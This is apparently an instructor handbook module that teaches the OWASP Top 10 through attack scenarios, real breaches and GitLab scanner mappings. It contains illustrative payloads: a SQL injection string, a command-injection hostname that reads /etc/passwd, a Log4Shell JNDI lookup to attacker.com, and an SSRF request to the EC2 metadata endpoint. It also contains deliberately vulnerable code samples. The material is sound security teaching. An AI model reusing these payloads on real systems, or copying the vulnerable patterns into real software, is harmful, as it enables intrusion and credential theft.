# INSTRUCTOR HANDBOOK — MODULE 8
## OWASP Top 10: Attack Scenarios, Detection, and GitLab Integration

---

### Module Metadata

| Field          | Value                                              |
|----------------|----------------------------------------------------|
| Module Number  | 8 of 16                                            |
| Day            | Day 2                                              |
| Duration       | 90 minutes (70 min content + 20 min mapping exercise) |
| Difficulty     | Intermediate — real attack scenarios for each category |
| Prerequisites  | Module 7 complete                                  |
| Key Deliverable | OWASP Top 10 → GitLab mapping table (in 09_Mapping_Tables/) |

---

## Instructor Preparation Notes

### Teaching Approach
This module fails if delivered as a list recital. The OWASP Top 10 only becomes meaningful when each category is anchored to:
1. A **concrete attack scenario** the audience can visualise
2. A **real breach** where it caused measurable harm
3. A **GitLab scanner** that would have caught it

For each category, follow the four-beat structure: *Attack Story → Why It Exists → How Detected → GitLab Response*.

For the Robotics/IoT audience: extend each category with an embedded/firmware/ICS example. Injection attacks in MQTT command handlers. Insecure Design in OTA update validation logic. Cryptographic Failures in TLS implementation on constrained devices.

### OWASP Top 10 Reference (2021)
Official source: https://owasp.org/www-project-top-ten/

The 2021 list (current as of this writing):
- A01: Broken Access Control
- A02: Cryptographic Failures
- A03: Injection
- A04: Insecure Design
- A05: Security Misconfiguration
- A06: Vulnerable and Outdated Components
- A07: Identification and Authentication Failures
- A08: Software and Data Integrity Failures
- A09: Security Logging and Monitoring Failures
- A10: Server-Side Request Forgery (SSRF)

---

## Learning Objectives

1. Describe each OWASP Top 10 category with a concrete attack scenario and real-world impact.
2. Map each category to the GitLab security scanner(s) that detect it.
3. Identify prevention strategies for each category — both process and tooling.
4. Explain why each category appears on the Top 10 and what makes it persistent.
5. Use the mapping table to plan scanner coverage for a given application.

---

## OWASP Top 10 — Full Teaching Guide

---

### A01: Broken Access Control

**Origin Problem:**
Access control is the most basic security primitive — who can do what. Yet it is consistently the #1 vulnerability class. It moved from #5 to #1 in the 2021 update.

**What It Is:**
Restrictions on what authenticated users can do are not properly enforced. An attacker bypasses authorisation to access data or functions they should not be able to reach.

**Real Attack Scenario:**
> Insecure Direct Object Reference (IDOR): A user views their own order at `GET /api/orders/12345`. They change the ID to `/api/orders/12346` and see another customer's order — because the API only checks authentication (is the user logged in?) not authorisation (does this user own order 12346?). At scale: automated enumeration of 100,000 order IDs exposes the entire customer database.

**Real Breach:** Optus Australia (2022) — 9.8 million customer records exposed via unauthenticated API endpoint that returned user data when queried by sequential customer ID.

**Why It Persists:**
Access control is complex, application-specific logic. No scanner can fully verify that "this user should not see that data" — that requires understanding business logic. However, common patterns ARE detectable.

**Detection Methods:**
- SAST: Detect missing authorisation checks in controllers/handlers; detect direct object references without ownership validation
- DAST: Test endpoint access with different user roles; enumerate parameter values

**GitLab Integration:**
- SAST: Semgrep rules for missing `@authorization_required` decorators, missing ownership checks
- DAST (Ultimate): Test authenticated API endpoints with manipulated parameters
- Manual: Code review via MR + CODEOWNERS for API endpoint code

**For IoT/Robotics:**
> OTA update authorisation: does your OTA server verify the requesting device is authorised to receive a specific firmware version? Or does any device with network access receive any firmware? Broken access control on the OTA endpoint = any attacker can push arbitrary firmware to any device.

---

### A02: Cryptographic Failures

**What It Is (formerly "Sensitive Data Exposure"):**
Cryptographic failures expose sensitive data due to: not encrypting data at rest or in transit, using weak or deprecated algorithms, poor key management, or misusing cryptographic APIs.

**Real Attack Scenario:**
> Password database stored with MD5 hashes (unsalted). Attacker gains read access to the database (SQL injection, misconfigured backup). MD5 hashes of common passwords crack in seconds using rainbow tables or GPU brute force. 60% of user accounts compromised within hours.

**Real Breach:** LinkedIn (2012) — 117 million passwords stored as unsalted SHA1. When breached and posted online, passwords cracked trivially.

**Common Patterns:**
- HTTP instead of HTTPS for sensitive data
- Hardcoded encryption keys in source code
- Weak algorithm usage: MD5/SHA1 for passwords, ECB mode for block ciphers, DES/3DES
- Private keys committed to repositories
- TLS certificate validation disabled in code (`verify=False`)

**Detection Methods:**
- SAST: Detect `hashlib.md5()`, `hashlib.sha1()` for password operations; detect `ssl._create_unverified_context()`; detect hardcoded keys
- Secret Detection: Detect private keys, certificates, API keys in committed files
- Code review: Manual review of cryptographic implementations

**GitLab Integration:**
- SAST (Semgrep): Rules for weak cryptographic algorithms, disabled TLS verification
- Secret Detection: Gitleaks patterns for private keys, certificates, AWS keys
- MR review: CODEOWNERS for `/src/crypto/` paths

**For Embedded/IoT:**
> TLS on constrained devices: IoT devices often disable TLS certificate validation due to the computational overhead or complexity of maintaining CA certificates on-device. This is a critical cryptographic failure — "connecting to the real server" is unauthenticated. MQTT over TLS with client certificates is the correct pattern.

---

### A03: Injection

**What It Is:**
Hostile data sent to an interpreter as part of a command or query. SQL injection is the most famous, but injection covers: OS command injection, LDAP injection, NoSQL injection, template injection, XML/XPath injection.

**Real Attack Scenario (SQL Injection):**
```python
# Vulnerable code
def get_user(username):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    return db.execute(query)

# Attacker input: admin' OR '1'='1
# Resulting query: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# Result: returns ALL users
```

**Real Breach:** British Airways (2018) — SQL injection used to access customer PII and payment card data. £20 million GDPR fine.

**Command Injection Example:**
```python
# Vulnerable: passes user input directly to shell
import subprocess
def ping_host(hostname):
    result = subprocess.run(f"ping -c 1 {hostname}", shell=True)

# Attacker input: "google.com; cat /etc/passwd"
# Executes: ping -c 1 google.com; cat /etc/passwd
```

**For Robotics/IoT:**
> ROS (Robot Operating System) uses message passing between nodes. A node that processes string commands from an external interface without sanitisation is vulnerable to command injection. An attacker who can publish to a ROS topic may inject arbitrary commands into the robot's execution context.

**Detection Methods:**
- SAST: Detect string concatenation in database queries; detect `shell=True` with unsanitised input; detect unsafe deserialization
- DAST: Automated injection testing against running application endpoints

**GitLab Integration:**
- SAST rules for SQL injection patterns across Python, Java, Go, Ruby, JavaScript, PHP
- DAST (Ultimate): Automated ZAP injection tests against deployed QA environment

**Prevention:**
- Use parameterised queries / prepared statements — never string concatenation
- Input validation and allowlisting
- Least-privilege database accounts
- Command injection: avoid `shell=True`; use `subprocess.run(["cmd", "arg"])` with array arguments

---

### A04: Insecure Design

**What It Is:**
Security flaws rooted in design decisions rather than implementation bugs. Missing or ineffective security controls by design — threat modelling was not performed; security requirements were not defined.

**Examples:**
- Password reset via security questions (bypassable by social engineering or public information)
- "Remember me" token stored as plaintext in local storage
- Admin function accessible to any authenticated user (missing role check by design)
- No rate limiting on authentication endpoint by design
- OTA update channel with no signature verification by design

**Key Distinction from Other Categories:**
> "A01 (Broken Access Control) is when access control is implemented but bypassed. A04 (Insecure Design) is when access control was never designed to exist. The fix for A01 is code. The fix for A04 is architecture — which is much more expensive."

**Real Scenario:**
> A medical device allows firmware updates over Bluetooth. The update protocol was designed to accept any firmware image that has a valid CRC. A valid CRC is not a signature — any attacker with Bluetooth range can compute the correct CRC for a malicious firmware image and push it to the device. This is insecure design: signature verification was never included in the design.

**Detection Methods:**
- Design review / threat modelling (STRIDE) — cannot be automated
- SAST: detect absence of rate limiting decorators, missing auth on sensitive routes
- Architecture review in MR process — CODEOWNERS for architecture decisions

**GitLab Integration:**
- MR template with security design checklist
- CODEOWNERS: architecture team review for new API endpoints, new authentication flows
- GitLab Issues with security label for design-phase requirements tracking

---

### A05: Security Misconfiguration

**What It Is:**
Insecure default configurations, incomplete configurations, open cloud storage, verbose error messages exposing stack traces, unnecessary features enabled.

**Real Attack Scenarios:**
1. S3 bucket with public read access → exposed customer data (Capital One 2019)
2. Default admin credentials on a network device → full network compromise
3. Stack trace returned to users → application internals exposed (database schema, file paths)
4. Debug mode enabled in production Flask/Django → interactive debugger accessible

**For Kubernetes:**
> Pods running as root. No network policies (any pod can reach any service). `hostPID: true` on pod spec. These are all IaC security misconfigurations detectable by scanning Kubernetes manifests.

**For Terraform:**
```hcl
# ❌ Security misconfiguration — S3 bucket publicly accessible
resource "aws_s3_bucket" "data" {
  bucket = "company-data"
}

resource "aws_s3_bucket_acl" "data_acl" {
  bucket = aws_s3_bucket.data.id
  acl    = "public-read"  # ← KICS will flag this
}
```

**Detection Methods:**
- IaC Scanning (KICS): Detect `public-read` S3 ACLs, unrestricted security groups, missing encryption
- Container Scanning: Detect containers running as root, missing health checks
- SAST: Detect `DEBUG=True` in production config, verbose error handlers

**GitLab Integration:**
- IaC Scanning via KICS: `include: template: Jobs/IaC-Scanning.gitlab-ci.yml`
- Container Scanning: Detect misconfigured Docker images
- Source: https://docs.gitlab.com/ee/user/application_security/iac_scanning/

---

### A06: Vulnerable and Outdated Components

**What It Is:**
Using components (libraries, frameworks, OS packages) with known vulnerabilities. The most directly and automatically detectable category.

**Real Breach — Log4Shell (CVE-2021-44228):**
- Log4j 2.x Java logging library used by thousands of applications
- JNDI lookup injection: `${jndi:ldap://attacker.com/exploit}` in any logged string
- Severity: CVSS 10.0 (maximum)
- Disclosed December 9, 2021
- Within 72 hours: 40,000+ exploitation attempts per hour observed
- Affected organisations: Apple, Amazon, Cloudflare, VMware, and virtually every enterprise with Java applications

**Why SCA Matters:**
> "With Log4Shell, organisations that had dependency scanning in their pipeline knew within the next pipeline run which services used Log4j 2.x. Organisations without SCA spent weeks conducting manual inventory. The difference: hours vs. weeks of exposure."

**What SCA Scans:**
- Python: `requirements.txt`, `Pipfile.lock`, `pyproject.toml`
- JavaScript/Node: `package.json`, `package-lock.json`, `yarn.lock`
- Java: `pom.xml`, `build.gradle`
- Go: `go.mod`, `go.sum`
- Ruby: `Gemfile`, `Gemfile.lock`
- Rust: `Cargo.toml`, `Cargo.lock`

**GitLab Integration:**
- Dependency Scanning (Ultimate): `include: template: Jobs/Dependency-Scanning.gitlab-ci.yml`
- Compares against: OSV, GitHub Advisory Database, NVD, GitLab advisory database
- Source: https://docs.gitlab.com/ee/user/application_security/dependency_scanning/
- SBOM: GitLab generates a software bill of materials (Dependency List view)

**For Embedded:**
> Embedded systems frequently use aged, unmaintained C/C++ libraries. A BSP that uses an OpenSSL version from 2018 carries known TLS vulnerabilities. Dependency scanning applies to C/C++ via SBOM generation from build manifests.

---

### A07: Identification and Authentication Failures

**What It Is (formerly "Broken Authentication"):**
Weaknesses in authentication and session management. Permits attackers to compromise passwords, keys, or session tokens.

**Common Patterns:**
- No brute-force protection on login endpoint
- Weak or predictable session tokens
- Session fixation (pre-authentication session ID used post-authentication)
- Cleartext password storage (should be bcrypt, Argon2, scrypt)
- Missing MFA for administrative functions
- Insecure password reset (token in URL, long-lived token, no one-time use)

**Real Scenario:**
> A user management API has no rate limiting on `POST /api/login`. Attacker scripts 100 requests/second with common passwords against known usernames. No CAPTCHA, no account lockout. The credential stuffing attack succeeds on 2% of accounts — which on a 1M user platform = 20,000 compromised accounts.

**Detection Methods:**
- SAST: Detect missing rate limiting decorators, detect `password == stored_password` (plaintext comparison), detect weak hash functions for passwords
- DAST: Automated brute-force simulation, session token analysis
- Code review: Manual review of authentication flows

**GitLab Integration:**
- SAST: Detect authentication anti-patterns
- DAST (Ultimate): Session management testing via OWASP ZAP
- CODEOWNERS: Security team mandatory review for `/src/auth/` path

---

### A08: Software and Data Integrity Failures

**What It Is (new in 2021):**
Failures to protect software updates, critical data, and CI/CD pipelines from integrity violations. Includes: unsigned software updates, untrusted deserialization, and CI/CD pipeline compromise.

**The SolarWinds Attack (2020):**
- Attacker compromised SolarWinds' build environment
- Inserted malicious code (SUNBURST backdoor) into Orion software update
- Signed update distributed to 18,000 customers including US government agencies
- Active presence in target networks for 9+ months before detection
- This was a **software supply chain attack** — compromising the build pipeline

**Why CI/CD Integrity Matters:**
> "Your CI/CD pipeline has the same access to production as your most privileged developers. It can push to your container registry, deploy to Kubernetes, and modify infrastructure. If an attacker compromises your pipeline — via a malicious dependency, a compromised Runner, or an injected build step — they have everything."

**GitLab Integrity Controls:**
- Signed artifacts: cosign integration for container image signing
- Protected CI/CD variables (not accessible from untrusted branches)
- Protected Runners (only run pipelines from protected branches)
- SBOM generation: track component provenance
- Dependency review in MR: flag newly introduced dependencies

**Deserialization:**
Unsafe deserialization of untrusted data is a classic RCE vector. Python `pickle`, Java `ObjectInputStream`, Ruby `Marshal.load` with untrusted data are all high-risk patterns.

**GitLab Integration:**
- SAST: Detect unsafe deserialization patterns (`pickle.loads(user_input)`)
- Supply Chain Security: Module 13 covers this in depth

---

### A09: Security Logging and Monitoring Failures

**What It Is:**
Insufficient logging, monitoring, and alerting. Without effective logging, breaches go undetected. OWASP estimates breaches take **200+ days to detect** on average.

**What Must Be Logged:**
- Authentication events (success and failure)
- Authorisation failures (access denied)
- Input validation failures
- Application errors
- Session management events

**What Must NOT Be Logged:**
- Passwords (even failed login attempts)
- Full credit card numbers
- PII beyond what is required

**Real Scenario:**
> An attacker spends 30 days conducting slow, low-volume SQL injection probing against an API. Each probe returns a 500 error, which is logged but never alerted on. The attacker extracts the entire user database over 30 days — each query small enough to avoid volume-based detection. If error rates had been monitored, a spike in 500s would have triggered investigation on day 1.

**For Robotics/IoT:**
> A robot controller that does not log failed authentication attempts to its control API cannot detect brute-force attacks. A device that does not log firmware update events cannot detect unauthorised firmware pushes. Logging is as critical on embedded systems as on cloud services — it is just constrained by storage.

**GitLab Integration:**
- SAST: Detect missing logging in authentication handlers, detect sensitive data in log statements
- GitLab Audit Events: Platform-level logging for all GitLab operations
- Note: Application-level logging is a code concern — SAST helps identify missing log statements

---

### A10: Server-Side Request Forgery (SSRF)

**What It Is:**
An attacker causes the server to make HTTP requests to an attacker-specified URL. The server's request can reach internal services that the attacker cannot reach directly from the internet.

**Attack Scenario:**
```
Legitimate use: User submits URL → server fetches preview image → shows to user
Attack:         User submits http://169.254.169.254/latest/meta-data/
                (AWS EC2 metadata endpoint — accessible only from EC2)
                Server fetches it, returns: IAM role credentials
                Attacker now has AWS credentials
```

**Real Breach:** Capital One (2019) — SSRF via misconfigured WAF allowed attacker to query EC2 metadata endpoint, obtain IAM credentials, access S3 buckets. 100 million customer records exposed.

**Common SSRF Vectors:**
- URL fetch functionality (link preview, webhook URL, image import)
- PDF generation from user-supplied HTML
- Server-side XML/JSON parsing with external entity references (XXE is a subtype)

**For IoT/Cloud Hybrid:**
> IoT device management APIs often fetch external resources (firmware URLs, certificate URLs). SSRF in the device management API can expose internal cloud infrastructure, other devices' management endpoints, or cloud provider metadata.

**Detection Methods:**
- SAST: Detect `requests.get(user_input)` without URL validation; detect XXE patterns
- DAST: Automated SSRF probing of URL parameters

**GitLab Integration:**
- SAST: Detect unvalidated URL fetch patterns
- DAST (Ultimate): OWASP ZAP SSRF detection against deployed QA environment

---

## Discussion Exercise (20 minutes)

### OWASP Top 10 Priority Mapping Exercise

**Instructions:** In groups of 3, choose ONE category from A01–A10 that is most relevant to your codebase/product.

For that category:
1. Describe a concrete attack scenario specific to your system
2. Identify which GitLab scanner would detect it
3. Write one SAST-detectable code pattern that represents this vulnerability
4. Describe the prevention (code fix + process fix)

Groups present for 3 minutes each. Instructor captures key patterns on whiteboard.

---

## References

1. **OWASP Top 10 (2021)** — https://owasp.org/www-project-top-ten/
2. **A01: Broken Access Control** — https://owasp.org/Top10/A01_2021-Broken_Access_Control/
3. **A02: Cryptographic Failures** — https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
4. **A03: Injection** — https://owasp.org/Top10/A03_2021-Injection/
5. **A04: Insecure Design** — https://owasp.org/Top10/A04_2021-Insecure_Design/
6. **A05: Security Misconfiguration** — https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
7. **A06: Vulnerable Components** — https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
8. **A07: Auth Failures** — https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
9. **A08: Integrity Failures** — https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
10. **A09: Logging Failures** — https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
11. **A10: SSRF** — https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
12. **GitLab Dependency Scanning** — https://docs.gitlab.com/ee/user/application_security/dependency_scanning/
13. **GitLab SAST** — https://docs.gitlab.com/ee/user/application_security/sast/
14. **GitLab DAST** — https://docs.gitlab.com/ee/user/application_security/dast/
15. **GitLab IaC Scanning** — https://docs.gitlab.com/ee/user/application_security/iac_scanning/
16. **Log4Shell CVE-2021-44228** — https://nvd.nist.gov/vuln/detail/CVE-2021-44228
